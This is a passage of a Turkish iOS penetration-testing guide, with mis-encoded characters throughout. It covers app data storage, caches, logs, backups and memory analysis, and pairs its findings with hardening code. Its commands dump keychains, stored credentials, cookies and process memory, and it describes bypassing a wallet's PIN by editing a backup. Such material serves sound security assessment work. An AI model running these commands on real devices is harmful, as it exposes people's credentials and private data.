**Objection Oturumu Ä°Ã§inde:** Mobil uygulamalarÄ± analiz etmek iÃ§in, plist dosyalarÄ±nÄ± doÄŸrudan dÃ¶nÃ¼ÅŸtÃ¼rmenizi saÄŸlayan Ã¶zel bir komut vardÄ±r:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) uygulamanÄ±zdaki nesnelerin model katmanÄ±nÄ± yÃ¶netmek iÃ§in bir Ã§erÃ§evedir. [Core Data, kalÄ±cÄ± depolama olarak SQLite kullanabilir](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ancak Ã§erÃ§eve kendisi bir veritabanÄ± deÄŸildir.\
CoreData varsayÄ±lan olarak verilerini ÅŸifrelemez. Ancak, CoreData'ya ek bir ÅŸifreleme katmanÄ± eklenebilir. Daha fazla ayrÄ±ntÄ± iÃ§in [GitHub Repo](https://github.com/project-imas/encrypted-core-data) sayfasÄ±na bakÄ±n.

Bir uygulamanÄ±n SQLite Core Data bilgilerini `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` yolunda bulabilirsiniz.

**SQLite'yi aÃ§Ä±p hassas bilgilere eriÅŸebiliyorsanÄ±z, o zaman bir yanlÄ±ÅŸ yapÄ±landÄ±rma buldunuz.**

{% code title="Code from iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) SQLite Ã¼zerine inÅŸa edilmiÅŸ bir anahtar/deÄŸer deposudur.\
Yap veritabanlarÄ± sqlite veritabanlarÄ± olduÄŸundan, Ã¶nceki bÃ¶lÃ¼mde Ã¶nerilen komutu kullanarak bunlarÄ± bulabilirsiniz.

### DiÄŸer SQLite VeritabanlarÄ±

UygulamalarÄ±n kendi sqlite veritabanlarÄ±nÄ± oluÅŸturmasÄ± yaygÄ±ndÄ±r. Bu veritabanlarÄ±nda **duyarlÄ±** **veri** **saklÄ±yor** olabilirler ve bunu ÅŸifrelemeden bÄ±rakabilirler. Bu nedenle, her zaman uygulama dizinindeki her veritabanÄ±nÄ± kontrol etmek ilginÃ§tir. Bu nedenle, verilerin kaydedildiÄŸi uygulama dizinine gidin (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ±

GeliÅŸtiriciler, Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ± aracÄ±lÄ±ÄŸÄ±yla **veri depolayÄ±p senkronize etme** yeteneÄŸine sahiptir. JSON formatÄ±nda depolanan veriler, gerÃ§ek zamanlÄ± olarak tÃ¼m baÄŸlÄ± istemcilere senkronize edilir.

YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ Firebase veritabanlarÄ±nÄ± nasÄ±l kontrol edeceÄŸinizi burada bulabilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm veritabanlarÄ±

[Realm Objective-C](https://realm.io/docs/objc/latest/) ve [Realm Swift](https://realm.io/docs/swift/latest/) Apple tarafÄ±ndan saÄŸlanmayan veri depolama iÃ§in gÃ¼Ã§lÃ¼ bir alternatif sunar. VarsayÄ±lan olarak, **verileri ÅŸifrelenmemiÅŸ olarak depolar**, belirli bir yapÄ±landÄ±rma ile ÅŸifreleme mevcuttur.

VeritabanlarÄ± ÅŸu konumda bulunmaktadÄ±r: `/private/var/mobile/Containers/Data/Application/{APPID}`. Bu dosyalarÄ± keÅŸfetmek iÃ§in ÅŸu gibi komutlar kullanÄ±labilir:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Bu veritabanÄ± dosyalarÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in [**Realm Studio**](https://github.com/realm/realm-studio) aracÄ±nÄ±n kullanÄ±lmasÄ± Ã¶nerilir.

Bir Realm veritabanÄ±nda ÅŸifreleme uygulamak iÃ§in aÅŸaÄŸÄ±daki kod parÃ§asÄ± kullanÄ±labilir:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite VeritabanlarÄ±

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios), **hafif** ve **gÃ¶mÃ¼lÃ¼** bir veritabanÄ± motoru olarak tanÄ±mlanÄ±r ve **belge odaklÄ±** (NoSQL) yaklaÅŸÄ±mÄ± takip eder. **iOS** ve **macOS** iÃ§in yerel olarak tasarlanmÄ±ÅŸ olup, verileri sorunsuz bir ÅŸekilde senkronize etme yeteneÄŸi sunar.

Bir cihazda potansiyel Couchbase veritabanlarÄ±nÄ± belirlemek iÃ§in aÅŸaÄŸÄ±daki dizin incelenmelidir:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Ã‡erezler

iOS, uygulamalarÄ±n Ã§erezlerini her uygulama klasÃ¶rÃ¼ iÃ§indeki **`Library/Cookies/cookies.binarycookies`** dosyasÄ±nda saklar. Ancak, geliÅŸtiriciler bazen bunlarÄ± **anahtar zincirinde** saklamayÄ± tercih ederler Ã§Ã¼nkÃ¼ belirtilen **Ã§erez dosyasÄ± yedeklerde eriÅŸilebilir**.

Ã‡erez dosyasÄ±nÄ± incelemek iÃ§in [**bu python betiÄŸini**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) kullanabilir veya objection'Ä±n **`ios cookies get`** komutunu kullanabilirsiniz.\
**Bu dosyalarÄ± JSON formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek ve verileri incelemek iÃ§in objection'Ä± da kullanabilirsiniz.**
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

VarsayÄ±lan olarak NSURLSession, **HTTP istekleri ve yanÄ±tlarÄ± Cache.db** veritabanÄ±nda depolar. Bu veritabanÄ±, tokenlar, kullanÄ±cÄ± adlarÄ± veya baÅŸka herhangi bir hassas bilgi Ã¶nbelleÄŸe alÄ±ndÄ±ysa **hassas veriler** iÃ§erebilir. Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ bilgileri bulmak iÃ§in uygulamanÄ±n veri dizinini aÃ§Ä±n (`/var/mobile/Containers/Data/Application/<UUID>`) ve `/Library/Caches/<Bundle Identifier>` dizinine gidin. **WebKit Ã¶nbelleÄŸi de Cache.db** dosyasÄ±nda depolanmaktadÄ±r. **Objection**, `sqlite connect Cache.db` komutuyla veritabanÄ±nÄ± aÃ§abilir ve etkileÅŸimde bulunabilir, Ã§Ã¼nkÃ¼ bu **normal bir SQLite veritabanÄ±dÄ±r**.

Bu verilerin Ã¶nbelleÄŸe alÄ±nmasÄ±nÄ± **devre dÄ±ÅŸÄ± bÄ±rakmanÄ±z Ã¶nerilir**, Ã§Ã¼nkÃ¼ istek veya yanÄ±tta hassas bilgiler iÃ§erebilir. AÅŸaÄŸÄ±daki liste, bunu baÅŸarmanÄ±n farklÄ± yollarÄ±nÄ± gÃ¶stermektedir:

1.  Ã‡Ä±kÄ±ÅŸ yaptÄ±ktan sonra Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ yanÄ±tlarÄ±n kaldÄ±rÄ±lmasÄ± Ã¶nerilir. Bu, Apple tarafÄ±ndan saÄŸlanan [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) yÃ¶ntemi ile yapÄ±labilir. Bu yÃ¶ntemi aÅŸaÄŸÄ±daki gibi Ã§aÄŸÄ±rabilirsiniz:

`URLCache.shared.removeAllCachedResponses()`

Bu yÃ¶ntem, Cache.db dosyasÄ±ndan tÃ¼m Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ istekleri ve yanÄ±tlarÄ± kaldÄ±racaktÄ±r.
2.  Ã‡erezlerin avantajÄ±nÄ± kullanmanÄ±za gerek yoksa, URLSession'Ä±n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) yapÄ±landÄ±rma Ã¶zelliÄŸini kullanmanÄ±z Ã¶nerilir; bu, Ã§erezlerin ve Ã¶nbelleklerin kaydedilmesini devre dÄ±ÅŸÄ± bÄ±rakÄ±r.

[Apple belgeleri](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`GeÃ§ici bir oturum yapÄ±landÄ±rma nesnesi, varsayÄ±lan bir oturum yapÄ±landÄ±rmasÄ±na (bkz. varsayÄ±lan) benzer, ancak ilgili oturum nesnesi Ã¶nbellekleri, kimlik bilgisi depolarÄ±nÄ± veya herhangi bir oturumla ilgili veriyi diske kaydetmez. Bunun yerine, oturumla ilgili veriler RAM'de depolanÄ±r. GeÃ§ici bir oturumun diske veri yazdÄ±ÄŸÄ± tek zaman, bir URL'nin iÃ§eriÄŸini bir dosyaya yazmasÄ±nÄ± sÃ¶ylediÄŸiniz zamandÄ±r.`
3. Ã–nbellek, Ã–nbellek PolitikasÄ±nÄ± [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) olarak ayarlayarak da devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir. Bu, Ã¶nbelleÄŸi herhangi bir ÅŸekilde, ister bellek ister disk Ã¼zerinde depolamayÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r.

### Snapshots

Ana dÃ¼ÄŸmeye her bastÄ±ÄŸÄ±nÄ±zda, iOS **mevcut ekranÄ±n bir anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r** ve uygulamaya geÃ§iÅŸi Ã§ok daha akÄ±cÄ± bir ÅŸekilde yapabilmek iÃ§in. Ancak, eÄŸer **hassas** **veri** mevcut ekranÄ±n iÃ§indeyse, bu **gÃ¶rÃ¼ntÃ¼de** **kaydedilir** (bu **yeniden baÅŸlatmalarda** **sÃ¼rdÃ¼rÃ¼lÃ¼r**). Bunlar, uygulamalar arasÄ±nda geÃ§iÅŸ yapmak iÃ§in ana ekranÄ± Ã§ift tÄ±klayarak eriÅŸebileceÄŸiniz anlÄ±k gÃ¶rÃ¼ntÃ¼lerdir.

iPhone jailbreak edilmedikÃ§e, **saldÄ±rganÄ±n** bu ekran gÃ¶rÃ¼ntÃ¼lerini gÃ¶rebilmesi iÃ§in **cihaza** **eriÅŸimi** **aÃ§Ä±k** olmalÄ±dÄ±r. VarsayÄ±lan olarak, son anlÄ±k gÃ¶rÃ¼ntÃ¼ uygulamanÄ±n sandbox'Ä±nda `Library/Caches/Snapshots/` veya `Library/SplashBoard/Snapshots` klasÃ¶rÃ¼nde depolanÄ±r (gÃ¼venilir bilgisayarlar iOX 7.0'dan itibaren dosya sistemine eriÅŸemez).

Bu kÃ¶tÃ¼ davranÄ±ÅŸÄ± Ã¶nlemenin bir yolu, anlÄ±k gÃ¶rÃ¼ntÃ¼ alÄ±nmadan Ã¶nce boÅŸ bir ekran koymak veya hassas verileri kaldÄ±rmaktÄ±r; bunu `ApplicationDidEnterBackground()` fonksiyonunu kullanarak yapabilirsiniz.

AÅŸaÄŸÄ±da, varsayÄ±lan bir ekran gÃ¶rÃ¼ntÃ¼sÃ¼ ayarlayacak bir Ã¶rnek dÃ¼zeltme yÃ¶ntemi bulunmaktadÄ±r.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Bu, uygulama arka plana alÄ±ndÄ±ÄŸÄ±nda arka plan resmini `overlayImage.png` olarak ayarlar. `overlayImage.png` mevcut gÃ¶rÃ¼nÃ¼mÃ¼ her zaman geÃ§ersiz kÄ±lacaÄŸÄ± iÃ§in hassas veri sÄ±zÄ±ntÄ±larÄ±nÄ± Ã¶nler.

### Anahtar Zinciri

iOS anahtar zincirine eriÅŸim ve yÃ¶netim iÃ§in, jailbreak yapÄ±lmÄ±ÅŸ cihazlar iÃ§in uygun olan [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) gibi araÃ§lar mevcuttur. AyrÄ±ca, benzer amaÃ§lar iÃ§in [**Objection**](https://github.com/sensepost/objection) `ios keychain dump` komutunu saÄŸlar.

#### **Kimlik Bilgilerini Saklama**

**NSURLCredential** sÄ±nÄ±fÄ±, hassas bilgileri doÄŸrudan anahtar zincirinde saklamak iÃ§in idealdir ve NSUserDefaults veya diÄŸer sarmalayÄ±cÄ±larÄ± atlamayÄ± saÄŸlar. GiriÅŸ yaptÄ±ktan sonra kimlik bilgilerini saklamak iÃ§in aÅŸaÄŸÄ±daki Swift kodu kullanÄ±lÄ±r:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Bu saklanan kimlik bilgilerini Ã§Ä±karmak iÃ§in, Objection'Ä±n `ios nsurlcredentialstorage dump` komutu kullanÄ±lÄ±r.

## **Ã–zel Klavyeler ve Klavye Ã–nbelleÄŸi**

iOS 8.0 ve sonrasÄ±nda, kullanÄ±cÄ±lar **Ayarlar > Genel > Klavye > Klavyeler** altÄ±nda yÃ¶netilebilen Ã¶zel klavye uzantÄ±larÄ± yÃ¼kleyebilir. Bu klavyeler geniÅŸletilmiÅŸ iÅŸlevsellik sunarken, tuÅŸ vuruÅŸlarÄ±nÄ± kaydetme ve verileri harici sunuculara iletme riski taÅŸÄ±r; ancak kullanÄ±cÄ±lar, aÄŸ eriÅŸimi gerektiren klavyeler hakkÄ±nda bilgilendirilir. Uygulamalar, hassas bilgi giriÅŸi iÃ§in Ã¶zel klavyelerin kullanÄ±mÄ±nÄ± kÄ±sÄ±tlayabilir ve kÄ±sÄ±tlamalÄ±dÄ±r.

**GÃ¼venlik Ã–nerileri:**

* GeliÅŸmiÅŸ gÃ¼venlik iÃ§in Ã¼Ã§Ã¼ncÃ¼ taraf klavyelerin devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± Ã¶nerilir.
* VarsayÄ±lan iOS klavyesinin otomatik dÃ¼zeltme ve otomatik Ã¶neri Ã¶zelliklerinin, `Library/Keyboard/{locale}-dynamic-text.dat` veya `/private/var/mobile/Library/Keyboard/dynamic-text.dat` konumundaki Ã¶nbellek dosyalarÄ±nda hassas bilgileri saklayabileceÄŸini unutmayÄ±n. Bu Ã¶nbellek dosyalarÄ±, hassas veriler iÃ§in dÃ¼zenli olarak kontrol edilmelidir. Ã–nbellek verilerini temizlemek iÃ§in **Ayarlar > Genel > SÄ±fÄ±rla > Klavye SÃ¶zlÃ¼ÄŸÃ¼nÃ¼ SÄ±fÄ±rla** yoluyla klavye sÃ¶zlÃ¼ÄŸÃ¼nÃ¼n sÄ±fÄ±rlanmasÄ± Ã¶nerilir.
* AÄŸ trafiÄŸini yakalamak, Ã¶zel bir klavyenin tuÅŸ vuruÅŸlarÄ±nÄ± uzaktan iletip iletmediÄŸini ortaya Ã§Ä±karabilir.

### **Metin AlanÄ± Ã–nbelleklemesini Ã–nleme**

[UITextInputTraits protokolÃ¼](https://developer.apple.com/reference/uikit/uitextinputtraits), hassas bilgi Ã¶nbelleklemesini Ã¶nlemek iÃ§in otomatik dÃ¼zeltme ve gÃ¼venli metin giriÅŸi yÃ¶netimi iÃ§in Ã¶zellikler sunar. Ã–rneÄŸin, otomatik dÃ¼zeltmeyi devre dÄ±ÅŸÄ± bÄ±rakmak ve gÃ¼venli metin giriÅŸini etkinleÅŸtirmek ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilebilir:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
AyrÄ±ca, geliÅŸtiricilerin metin alanlarÄ±nÄ±n, Ã¶zellikle ÅŸifreler ve PIN'ler gibi hassas bilgilerin girilmesi iÃ§in olanlarÄ±n, `autocorrectionType`'Ä± `UITextAutocorrectionTypeNo` ve `secureTextEntry`'yi `YES` olarak ayarlayarak Ã¶nbelleÄŸi devre dÄ±ÅŸÄ± bÄ±raktÄ±klarÄ±ndan emin olmalarÄ± gerekir.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logs**

Hata ayÄ±klama kodu genellikle **logging** kullanÄ±mÄ±nÄ± iÃ§erir. **LoglarÄ±n hassas bilgileri iÃ§erebileceÄŸi** bir risk vardÄ±r. Daha Ã¶nce, iOS 6 ve Ã¶nceki sÃ¼rÃ¼mlerde, loglar tÃ¼m uygulamalara eriÅŸilebilir durumdaydÄ± ve bu da hassas veri sÄ±zÄ±ntÄ±sÄ± riski oluÅŸturuyordu. **ArtÄ±k uygulamalar yalnÄ±zca kendi loglarÄ±na eriÅŸimle sÄ±nÄ±rlÄ±dÄ±r**.

Bu kÄ±sÄ±tlamalara raÄŸmen, **aÃ§Ä±k bir cihaza fiziksel eriÅŸimi olan bir saldÄ±rgan**, cihazÄ± bir bilgisayara baÄŸlayarak ve **loglarÄ± okuyarak** bunu istismar edebilir. LoglarÄ±n, uygulamanÄ±n kaldÄ±rÄ±lmasÄ±ndan sonra bile diskte kalmaya devam ettiÄŸini belirtmek Ã¶nemlidir.

Riskleri azaltmak iÃ§in, **uygulama ile kapsamlÄ± bir ÅŸekilde etkileÅŸimde bulunulmasÄ±** ve tÃ¼m iÅŸlevselliklerin ve girdilerin keÅŸfedilmesi Ã¶nerilir, bÃ¶ylece hassas bilgilerin yanlÄ±ÅŸlÄ±kla kaydedilmediÄŸinden emin olunabilir.

OlasÄ± sÄ±zÄ±ntÄ±lar iÃ§in uygulamanÄ±n kaynak kodunu incelerken, `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` gibi anahtar kelimeleri kullanarak hem **Ã¶nceden tanÄ±mlÄ±** hem de **Ã¶zel logging ifadelerini** arayÄ±n ve Ã¶zel uygulamalar iÃ§in `Logging` veya `Logfile` ifadelerine dikkat edin.

### **Monitoring System Logs**

Uygulamalar Ã§eÅŸitli hassas olabilecek bilgileri kaydeder. Bu loglarÄ± izlemek iÃ§in, ÅŸu araÃ§lar ve komutlar gibi:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
yararlÄ±dÄ±r. AyrÄ±ca, **Xcode** konsol gÃ¼nlÃ¼klerini toplamak iÃ§in bir yol saÄŸlar:

1. Xcode'u aÃ§Ä±n.
2. iOS cihazÄ±nÄ± baÄŸlayÄ±n.
3. **Window** -> **Devices and Simulators**'a gidin.
4. CihazÄ±nÄ±zÄ± seÃ§in.
5. Ä°ncelemekte olduÄŸunuz sorunu tetikleyin.
6. GÃ¼nlÃ¼kleri yeni bir pencerede gÃ¶rÃ¼ntÃ¼lemek iÃ§in **Open Console** butonunu kullanÄ±n.

Daha geliÅŸmiÅŸ gÃ¼nlÃ¼kleme iÃ§in, cihaz kabuÄŸuna baÄŸlanmak ve **socat** kullanmak gerÃ§ek zamanlÄ± gÃ¼nlÃ¼k izleme saÄŸlayabilir:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Log aktivitelerini gÃ¶zlemlemek iÃ§in komutlar, sorunlarÄ± teÅŸhis etmek veya loglarda potansiyel veri sÄ±zÄ±ntÄ±larÄ±nÄ± belirlemek iÃ§in Ã§ok deÄŸerli olabilir.

***

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Yedeklemeler

**Otomatik yedekleme Ã¶zellikleri**, iOS'a entegre edilmiÅŸtir ve iTunes (macOS Catalina'ya kadar), Finder (macOS Catalina'dan itibaren) veya iCloud aracÄ±lÄ±ÄŸÄ±yla cihaz verilerinin kopyalarÄ±nÄ± oluÅŸturmayÄ± kolaylaÅŸtÄ±rÄ±r. Bu yedeklemeler, Apple Pay detaylarÄ± ve Touch ID yapÄ±landÄ±rmalarÄ± gibi son derece hassas unsurlar hariÃ§, neredeyse tÃ¼m cihaz verilerini kapsar.

### GÃ¼venlik Riskleri

**Yedeklemelerdeki kurulu uygulamalar ve verileri** dahil edilmesi, potansiyel **veri sÄ±zÄ±ntÄ±sÄ±** ve **yedekleme deÄŸiÅŸikliklerinin uygulama iÅŸlevselliÄŸini deÄŸiÅŸtirme riski** sorununu gÃ¼ndeme getirir. Bu riskleri azaltmak iÃ§in, herhangi bir uygulamanÄ±n dizininde veya alt dizinlerinde hassas bilgilerin dÃ¼z metin olarak saklanmamasÄ± Ã¶nerilir.

### Yedeklemelerden DosyalarÄ± HariÃ§ Tutma

`Documents/` ve `Library/Application Support/` iÃ§indeki dosyalar varsayÄ±lan olarak yedeklenir. GeliÅŸtiriciler, `NSURL setResourceValue:forKey:error:` ile `NSURLIsExcludedFromBackupKey` kullanarak belirli dosyalarÄ± veya dizinleri yedeklemelerden hariÃ§ tutabilir. Bu uygulama, hassas verilerin yedeklemelere dahil edilmesini korumak iÃ§in kritik Ã¶neme sahiptir.

### AÃ§Ä±klar iÃ§in Test Etme

Bir uygulamanÄ±n yedekleme gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in, Ã¶nce Finder kullanarak **bir yedek oluÅŸturun**, ardÄ±ndan [Apple'Ä±n resmi belgeleri](https://support.apple.com/en-us/HT204215) rehberliÄŸinde yedeÄŸi bulun. Uygulama davranÄ±ÅŸÄ±nÄ± etkileyebilecek hassas veriler veya yapÄ±landÄ±rmalar iÃ§in yedeÄŸi analiz edin.

Hassas bilgilere, komut satÄ±rÄ± araÃ§larÄ± veya [iMazing](https://imazing.com) gibi uygulamalar kullanarak ulaÅŸÄ±labilir. Åifreli yedeklemeler iÃ§in, ÅŸifrelemenin varlÄ±ÄŸÄ±, yedeÄŸin kÃ¶kÃ¼ndeki "Manifest.plist" dosyasÄ±ndaki "IsEncrypted" anahtarÄ± kontrol edilerek doÄŸrulanabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Åifreli yedeklerle baÅŸa Ã§Ä±kmak iÃ§in, [DinoSec'in GitHub deposunda](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts) bulunan Python betikleri, **backup\_tool.py** ve **backup\_passwd.py** gibi, faydalÄ± olabilir, ancak en son iTunes/Finder sÃ¼rÃ¼mleriyle uyumlu hale getirmek iÃ§in ayarlamalar gerektirebilir. [**iOSbackup** aracÄ±](https://pypi.org/project/iOSbackup/) ise ÅŸifre korumalÄ± yedekler iÃ§indeki dosyalara eriÅŸim iÃ§in baÅŸka bir seÃ§enektir.

### Uygulama DavranÄ±ÅŸÄ±nÄ± DeÄŸiÅŸtirme

Yedekleme deÄŸiÅŸiklikleri yoluyla uygulama davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirme Ã¶rneÄŸi, [Bither bitcoin cÃ¼zdan uygulamasÄ±nda](https://github.com/bither/bither-ios) gÃ¶sterilmektedir; burada UI kilidi PIN'i `net.bither.plist` iÃ§inde **pin\_code** anahtarÄ± altÄ±nda saklanmaktadÄ±r. Bu anahtarÄ± plist'ten kaldÄ±rmak ve yedeÄŸi geri yÃ¼klemek, PIN gereksinimini ortadan kaldÄ±rarak sÄ±nÄ±rsÄ±z eriÅŸim saÄŸlar.

## Hassas Veriler iÃ§in Bellek Testi Ã–zeti

Bir uygulamanÄ±n belleÄŸinde saklanan hassas bilgilerle ilgilenirken, bu verilerin maruz kalma sÃ¼resini sÄ±nÄ±rlamak Ã§ok Ã¶nemlidir. Bellek iÃ§eriÄŸini araÅŸtÄ±rmak iÃ§in iki ana yaklaÅŸÄ±m vardÄ±r: **bir bellek dÃ¶kÃ¼mÃ¼ oluÅŸturmak** ve **belleÄŸi gerÃ§ek zamanlÄ± olarak analiz etmek**. Her iki yÃ¶ntemin de, dÃ¶kÃ¼m sÃ¼reci veya analiz sÄ±rasÄ±nda kritik verileri kaÃ§Ä±rma potansiyeli gibi zorluklarÄ± vardÄ±r.

## **Bir Bellek DÃ¶kÃ¼mÃ¼nÃ¼ Alma ve Analiz Etme**

Hem jailbreak yapÄ±lmÄ±ÅŸ hem de yapÄ±lmamÄ±ÅŸ cihazlar iÃ§in, [objection](https://github.com/sensepost/objection) ve [Fridump](https://github.com/Nightbringer21/fridump) gibi araÃ§lar, bir uygulamanÄ±n iÅŸlem belleÄŸini dÃ¶kme imkanÄ± sunar. DÃ¶kÃ¼m alÄ±ndÄ±ktan sonra, bu verileri analiz etmek, aradÄ±ÄŸÄ±nÄ±z bilginin doÄŸasÄ±na baÄŸlÄ± olarak Ã§eÅŸitli araÃ§lar gerektirir.

Bir bellek dÃ¶kÃ¼mÃ¼nden dizeleri Ã§Ä±karmak iÃ§in `strings` veya `rabin2 -zz` gibi komutlar kullanÄ±labilir:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Daha ayrÄ±ntÄ±lÄ± analiz iÃ§in, belirli veri tÃ¼rlerini veya desenlerini arama dahil, **radare2** geniÅŸ arama yetenekleri sunar:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ã‡alÄ±ÅŸma ZamanÄ± Bellek Analizi**

**r2frida**, bir uygulamanÄ±n belleÄŸini gerÃ§ek zamanlÄ± olarak incelemek iÃ§in gÃ¼Ã§lÃ¼ bir alternatif sunar, bellek dÃ¶kÃ¼mÃ¼ne ihtiyaÃ§ duymadan. Bu araÃ§, Ã§alÄ±ÅŸan uygulamanÄ±n belleÄŸinde doÄŸrudan arama komutlarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesini saÄŸlar:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## KÄ±rÄ±k Kriptografi

### ZayÄ±f Anahtar YÃ¶netim SÃ¼reÃ§leri

BazÄ± geliÅŸtiriciler hassas verileri yerel depolamada saklar ve bunu kodda hardcoded/tahmin edilebilir bir anahtar ile ÅŸifreler. Bu yapÄ±lmamalÄ±dÄ±r Ã§Ã¼nkÃ¼ bazÄ± tersine mÃ¼hendislik iÅŸlemleri, saldÄ±rganlarÄ±n gizli bilgileri Ã§Ä±karmasÄ±na olanak tanÄ±yabilir.

### GÃ¼vensiz ve/veya KullanÄ±mdan KaldÄ±rÄ±lmÄ±ÅŸ AlgoritmalarÄ±n KullanÄ±mÄ±

GeliÅŸtiriciler, yetkilendirme **kontrolleri** yapmak, **veri** **saklamak** veya **gÃ¶ndermek** iÃ§in **kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸ algoritmalar** kullanmamalÄ±dÄ±r. Bu algoritmalardan bazÄ±larÄ±: RC4, MD4, MD5, SHA1... Ã–rneÄŸin, ÅŸifreleri saklamak iÃ§in **hash** kullanÄ±lÄ±yorsa, tuz ile birlikte brute-force **dayanÄ±klÄ±** **hash**'ler kullanÄ±lmalÄ±dÄ±r.

### Kontrol

